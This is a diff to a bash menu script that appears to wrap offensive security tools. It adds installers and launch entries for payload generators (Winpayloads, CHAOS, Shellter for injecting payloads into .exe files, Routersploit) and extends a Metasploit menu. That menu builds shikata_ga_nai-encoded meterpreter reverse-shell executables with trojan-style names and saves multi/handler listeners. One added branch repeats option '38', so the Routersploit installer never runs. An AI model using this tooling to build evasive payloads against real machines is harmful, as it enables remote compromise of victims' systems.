@@ -1,6 +1,6 @@
 #! /bin/bash
-VERSION=1.9.9
-HOWMANYTOOLS=24
+VERSION=2.0.0
+HOWMANYTOOLS=27
 BACKL="0"
 #############DEFAULTS###############
 function defaults_l
@@ -457,6 +457,21 @@ function listshortcuts
 		TITLE="RED_HAWK"
 		NAMECD="cd /root/RED_HAWK"
 		KSSET="php rhawk.php"
+	elif [ "$nn" = "25" ]
+	then
+		TITLE="Winpayloads"
+		NAMECD="cd /root/Winpayloads"
+		KSSET="./WinPayloads.py"
+	elif [ "$nn" = "26" ]
+	then
+		TITLE="CHAOS"
+		NAMECD="cd /root/CHAOS"
+		KSSET="go run CHAOS.go"
+	elif [ "$nn" = "27" ]
+	then
+		TITLE="Routersploit"
+		NAMECD="cd /root/routersploit"
+		KSSET="./rsf.py"
 	fi
 }
 function reinstall_tools
@@ -500,6 +515,10 @@ do
 	echo -e ""$YS"33"$CE") Sniper"
 	echo -e ""$YS"34"$CE") ReconDog"
 	echo -e ""$YS"35"$CE") RED HAWK"
+	echo -e ""$YS"36"$CE") WinPayloads"
+	echo -e ""$YS"37"$CE") Shellter"
+	echo -e ""$YS"38"$CE") CHAOS"
+	echo -e ""$YS"39"$CE") Routersploit"
 	echo -e ""$YS"back"$CE") Go back"
 	echo -e ""$YS" 0"$CE") Exit"
 	echo -e "Choose: "
@@ -995,6 +1014,55 @@ do
 		echo -e "Installing RED HAWK"
 		echo -e "Tool by Tuhinshubhra"
 		git clone https://github.com/Tuhinshubhra/RED_HAWK.git
+	elif [ "$REIN" = "36" ]
+	then
+		if [ -d /root/Winpayloads ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			$READAK
+			rm -r /root/Winpayloads
+		fi
+		cd
+		echo -e "Installing Winpayloads"
+		echo -e "Tool by Nccgroup"
+		git clone https://github.com/nccgroup/Winpayloads.git
+		cd /root/Winpayloads
+		chmod +x setup.sh
+		./setup.sh
+		cd
+	elif [ "$REIN" = "37" ]
+	then
+		apt-get install shellter
+		sleep 2
+	elif [ "$REIN" = "38" ]
+	then
+		apt install golang upx-ucl -y
+		cd
+		if [ -d /root/CHAOS ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			$READAK
+			rm -r /root/CHAOS
+		fi
+		git clone https://github.com/tiagorlampert/CHAOS.git
+	elif [ "$REIN" = "38" ]
+	then
+		if [ -d /root/routersploit ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			$READAK
+			rm -r /root/routersploit
+		fi
+		cd
+		echo -e "Installing routersploit"
+		echo -e "Tool by reverse-shell"
+		git clone https://github.com/reverse-shell/routersploit
+		cd /root/routersploit
+		pip install -r requirements.txt
+		cd
 	elif [ "$REIN" = "back" ]
 	then
 		clear
@@ -1017,6 +1085,7 @@ echo -e ""$YS" 1"$CE") Fix no audio issue"
 echo -e ""$YS" 2"$CE") No output in wash"
 echo -e ""$YS" 3"$CE") No full screen"
 echo -e ""$YS" 4"$CE") Error constructing proxy for org.gnome.Terminal"
+echo -e ""$YS" 5"$CE") Error starting apache2 service"
 echo -e ""$YS"back"$CE") Go back"
 echo -e ""$YS" 0"$CE") EXIT"
 echo -e " Choose: "
@@ -1073,6 +1142,11 @@ then
 	sleep 2
 	echo -e "Reboot your system now"
 	sleep 3
+elif [ "$ERRS" = "5" ]
+then
+	service nginx stop
+	echo -e "I think i fixed it. Try again: service apache2 start "
+	sleep 5
 elif [ "$ERRS" = "back" ]
 then
 	BACKL="1"
@@ -1658,6 +1732,12 @@ function wifi_tools
 	else
 		echo -e ""$RS"23"$CE") "$RS"Angry IP Scanner"$CE"   IP Scanner"
 	fi
+	if [ -d /root/routersploit ]
+	then
+		echo -e ""$YS"24"$CE") Routersploit       Find/exploit router vulnerabilities"
+	else
+		echo -e ""$RS"24"$CE") "$RS"Routersploit"$CE"       Find/exploit router vulnerabilities"
+	fi
 	echo -e ""$YS"back"$CE") Go back"
 	echo -e ""$YS"00"$CE") Main menu"
 	#echo -e ""$YS" 0"$CE") EXIT"
@@ -2005,6 +2085,18 @@ function wifi_tools
 			echo -e "$PAKTGB"
 			$READAK
 		fi
+	elif [ "$APPP" = "24" ]
+	then
+		if [ -d "/root/routersploit" ]
+		then
+			cd /root/routersploit
+			./rsf.py
+			cd
+		else
+			echo -e "$TNI"
+			echo -e "$PAKTGB"
+			$READAK
+		fi
 	elif [ "$APPP" = "6" ]
 	then
 		if [ -d "/root/hakkuframework" ]
@@ -2123,6 +2215,24 @@ function remote_access
 	else
 		echo -e ""$RS" 5"$CE") "$RS"TheFatRat"$CE"    Generate undetectable payloads"
 	fi
+	if [ -d /root/Winpayloads ]
+	then
+		echo -e ""$YS" 6"$CE") Winpayloads  Generate undetectable payloads"
+	else
+		echo -e ""$RS" 6"$CE") "$RS"Winpayloads"$CE"  Generate undetectable payloads"
+	fi
+	if [ -f /usr/bin/shellter ]
+	then
+		echo -e ""$YS" 7"$CE") Shellter     Inject payload into .exe"
+	else
+		echo -e ""$RS" 7"$CE") "$RS"Shellter"$CE"     Inject payload into .exe"
+	fi
+	if [ -d /root/CHAOS ]
+	then
+		echo -e ""$YS" 8"$CE") CHAOS        Generate payloads/listeners"
+	else
+		echo -e ""$RS" 8"$CE") "$RS"CHAOS"$CE"        Generate payloads/listeners"
+	fi
 	echo -e ""$YS"back"$CE") Go back"
 	echo -e ""$YS"00"$CE") Main menu"
 	#echo -e ""$YS" 0"$CE") EXIT"
@@ -2136,6 +2246,27 @@ function remote_access
 			cd /root/BeeLogger
 			python bee.py
 			cd
+		else
+			echo -e "$TNI"
+			echo -e "$PAKTGB"
+			$READAK
+		fi
+	elif [ "$KEYLOG" = "8" ]
+	then
+		if [ -d /root/CHAOS ]
+		then
+			cd /root/CHAOS
+			go run CHAOS.go
+		else
+			echo -e "$TNI"
+			echo -e "$PAKTGB"
+			$READAK
+		fi	
+	elif [ "$KEYLOG" = "7" ]
+	then
+		if [ -f /usr/bin/shellter ]
+		then
+			shellter
 		else
 			echo -e "$TNI"
 			echo -e "$PAKTGB"
@@ -2213,6 +2344,7 @@ function remote_access
 				read -e PUPYPATH
 				cd /root/pupy/pupy
 				./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
+				cd
 			elif [ "$PUPY" = "2" ]
 			then
 				cd /root/pupy/pupy
@@ -2247,6 +2379,7 @@ function remote_access
 				clear
 				cd /root/zirikatu
 				./zirikatu.sh
+				cd
 			fi
 		else
 			echo -e "$TNI"
@@ -2258,6 +2391,18 @@ function remote_access
 		if [ -d /root/TheFatRat ]
 		then
 			fatrat
+		else
+			echo -e "$TNI"
+			echo -e "$PAKTGB"
+			$READAK
+		fi
+	elif [ "$KEYLOG" = "6" ]
+	then
+		if [ -d /root/Winpayloads ]
+		then
+			cd /root/Winpayloads
+			./WinPayloads.py
+			cd
 		else
 			echo -e "$TNI"
 			echo -e "$PAKTGB"
@@ -2367,7 +2512,7 @@ function metasploit_menu
 	clear
 	echo -e "---------------------------"$RS"METASPLOIT"$CE"----------------------------"
 	printf '\033]2;METASPLOIT\a'
-	echo -e ""$YS" 1"$CE") Create payload with msfvenom(windows/meterpreter/reverse_tcp)"
+	echo -e ""$YS" 1"$CE") Create payload with msfvenom"
 	echo -e ""$YS" 2"$CE") Create listener"
 	echo -e ""$YS" 3"$CE") Saved listeners"
 	echo -e ""$YS" 4"$CE") Start msfconsole"
@@ -2380,17 +2525,26 @@ function metasploit_menu
 	clear
 	if [ "$METASP" = "1" ]
 	then
-		echo -e "Enter the attacker's IP: "
+		PAYLOADL=""
+		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
+		read PAYLOADL
+		if [ -z "$PAYLOADL" ]
+		then
+			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
+			sleep 2
+			PAYLOADL="windows/meterpreter/reverse_tcp"
+		fi
+		echo -e "LHOST: "
 		read ATIP
 		echo -e ""
-		echo -e "Enter the attacker's PORT: "
+		echo -e "LPORT: "
 		read ATPORT
 		echo -e ""
 		echo -e "Enter the target's architecture("$YS"x86"$CE"/"$YS"x64"$CE"): "
 		read TARCH
 		echo -e "Enter the name of the payload(e.g: "$YS"trojan2"$CE"): "
 		read ATEXE
-		ATEXEPATH="/root/Desktop/'$ATEXE'.exe"
+		ATEXEPATH="/root/Desktop/$ATEXE.exe"
 		clear
 		echo -e "Generating"
 		sleep 0.1
@@ -2407,9 +2561,9 @@ function metasploit_menu
 		echo .
 		if [ "$TARCH" = "x64" ]
 		then
-			msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
+			msfvenom -p $PAYLOADL --platform windows -a x64 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
 		else
-			msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
+			msfvenom -p $PAYLOADL --platform windows -a x86 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
 		fi
 		echo -e "Done."
 		echo -e ""
@@ -2423,7 +2577,7 @@ function metasploit_menu
 			echo -e "Name of listener(e.g: "$YS"john"$CE") : "
 			read NAMEL
 			echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
-			echo "set PAYLOAD windows/meterpreter/reverse_tcp " >> "$LPATH"/rc/"$NAMEL".rc
+			echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
 			echo "set LHOST $ATIP " >> "$LPATH"/rc/"$NAMEL".rc
 			echo "set LPORT $ATPORT " >> "$LPATH"/rc/"$NAMEL".rc
 			echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
@@ -2490,14 +2644,21 @@ function metasploit_menu
 		while true
 		do
 		clear
-		ls "$LPATH"/rc
-		echo -e "Enter the name of the above listener(s) you want to select(e.g: "$YS"john"$CE")"
-		echo -e ""$YS"back"$CE") Go back"
+		ls -w 1 "$LPATH"/rc
+		echo -e ""
+		echo -e ""
+		echo -e "Enter the name of the listener you want to select(e.g: "$YS"john"$CE")"
+		echo -e ""$YS"reset"$CE") Delete all saved listeners"
+		echo -e ""$YS" back"$CE") Go back"
 		read NAMERC
 		clear
 		if [ "$NAMERC" = "back" ]
 		then
 			break
+		elif [ "$NAMERC" = "reset" ]
+		then
+			rm -f "$LPATH"/rc/*
+			continue
 		fi
 		if [ ! -f "$LPATH"/rc/"$NAMERC" ]
 		then
